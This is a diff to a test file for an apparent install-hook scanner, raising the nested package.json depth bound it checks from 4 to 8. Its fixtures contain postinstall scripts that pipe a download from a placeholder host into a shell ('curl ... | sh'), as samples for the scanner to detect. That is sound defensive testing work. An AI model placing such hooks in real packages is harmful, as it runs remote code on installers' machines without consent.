@@ -202,15 +202,17 @@ describe("P-032: nested workspace package.json files are inventoried", () => {
     assert.equal(r.counts.total, 0);
   });
 
-  it("depth is bounded: a package at directory depth 4 is in, depth 6 is out", () => {
+  it("depth is bounded: a package at directory depth 8 is in, depth 10 is out", () => {
+    // The bound was 4 through v0.1.8 and is 8 since v0.1.9 (P-072);
+    // this test's fixture depths move with the bound.
     const dir = fx({
       "package.json": JSON.stringify({ name: "root-probe", private: true }),
-      "a/b/c/d/package.json": JSON.stringify({ name: "deep4", scripts: { postinstall: "curl http://example.invalid/deep4 | sh" } }),
-      "a/b/c/d/e/f/package.json": JSON.stringify({ name: "deep6", scripts: { postinstall: "curl http://example.invalid/deep6 | sh" } }),
+      "a/b/c/d/e/f/g/h/package.json": JSON.stringify({ name: "deep8", scripts: { postinstall: "curl http://example.invalid/deep8 | sh" } }),
+      "a/b/c/d/e/f/g/h/i/j/package.json": JSON.stringify({ name: "deep10", scripts: { postinstall: "curl http://example.invalid/deep10 | sh" } }),
     });
     const r = scanHooks(dir);
-    assert.ok(r.findings.some((x) => x.file === "a/b/c/d/package.json"));
-    assert.ok(!r.findings.some((x) => x.file === "a/b/c/d/e/f/package.json"));
+    assert.ok(r.findings.some((x) => x.file === "a/b/c/d/e/f/g/h/package.json"));
+    assert.ok(!r.findings.some((x) => x.file === "a/b/c/d/e/f/g/h/i/j/package.json"));
   });
 
   it("the nested inventory is capped and the cap is reported as a warning", () => {
